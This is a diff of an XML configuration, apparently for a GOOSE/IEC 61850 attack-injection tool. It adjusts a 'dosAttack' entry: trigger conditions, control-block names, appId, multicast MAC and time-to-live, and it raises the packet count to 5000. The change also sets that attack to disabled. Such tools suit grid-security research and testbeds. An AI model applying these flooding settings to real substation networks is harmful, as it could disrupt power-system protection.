@@ -15,40 +15,41 @@
 			<modification arrayIndex="1" modifiedValue="999999"/>
                 </payload>
 	</attack>
-	
-	<attack name="dosAttack" enable="true">
+
+	<attack name="dosAttack" enable="false">
 		<condition>
-			<conditionType value="1"/>
-			<stNum value="0"/>
-			<sqNum value="0"/>
+			<conditionType value="2"/>
+			<stNum value="1"/>
+			<sqNum value="1"/>
 			<gcbName value="Alarm"/>
 			<time value="10"/>
 			<payload_conditions>
 				<!--payload_condition index="1" type="string" value="string"/-->
 				<!--payload_condition index="1" type="numeric" value="5" operator="equal"/-->
-				<paylaod_condition index="5" type="boolean" value="true"/>
+				<payload_condition index="5" type="boolean" value="true"/>
 			</payload_conditions>
 		</condition>
 		<payload>
 			<interface value="veth1.1"/>
 			<stNum value="0"/>
 			<sqNum value="0"/>
-			<gcbName value="LIED10CTRL/LLN0$Status"/>
-			<appId value="1000"/>
-			<dstAddress value="01:0c:cd:01:00:01"/>
+			<gcbName value="LIED10/CTRL/LLN0/Status"/>
+			<appId value="4096"/>
+			<!-- <dstAddress value="01:0c:cd:01:00:01"/> -->
+			<dstAddress value="010ccd010001"/>
 			<vlanId value="0"/>
 			<vlanPriority value="0"/>
-			<gocbRef value="LIED10CTRL/LLN0$Status"/>
-			<timeAllowedtoLive value="1500"/>
+			<gocbRef value="LIED10CTRL/LLN0$GO$Status"/>
+			<timeAllowedtoLive value="109"/>
 			<dataSet value="LIED10CTRL/LLN0$Status"/>
-			<goID value="LIED10CTRL/LLN0$Status"/>
+			<goID value="LIED10CTRL/LLN0$GO$Status"/>
 			<values>
 				<value type="integer" value="1234"/>
 				<value type="integer" value="5678"/>
 			</values>
 		</payload>
 		<stop_condition>
-			<packetsNum value="100"/>
+			<packetsNum value="5000"/>
 		</stop_condition>
 	</attack>
 
